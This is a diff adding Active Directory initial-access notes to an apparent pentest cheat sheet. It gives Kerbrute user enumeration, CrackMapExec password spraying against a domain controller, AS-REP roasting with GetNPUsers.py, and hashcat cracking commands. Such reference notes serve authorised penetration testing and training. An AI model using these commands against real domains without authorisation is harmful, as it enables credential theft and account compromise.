@@ -1,5 +1,33 @@
 # Initial Access attacks
+* [Web Attacks](#Web-Attacks) 
+* [Password Attacks](#Password Attacks)
 
+
+## Web Attacks
+- It is possible to get access by abusing a lot of web attacks which might give you access to the system. There are to many to subscribe here, but I might make a list someday.
+
+## Password Attacks
+### Kerbrute Enum users
+- https://github.com/ropnop/kerbrute
+```
+sudo ./kerbrute userenum -d <domain> domain_users.txt
+```
+
+#### Spray one password against all users
+- Use ```--continue-on-success``` too keep going after 1 successful login
+```
+crackmapexec smb <DC IP> -d <DOMAIN> -u domain_users.txt -p <PASSWORD LIST> | tee passwordspray.txt
+```
+
+### AS-REP Roasting
+```
+python3 GetNPUsers.py <DOMAIN>/ -usersfile domain_users.txt -format hashcat -outputfile AS_REP_hashcat.txt
+```
+
+#### Crack hashes with hashcat
+```
+hashcat -a 0 -m 18200 hash.txt rockyou.txt
+```
 
 ## Relaying attacks
 - https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
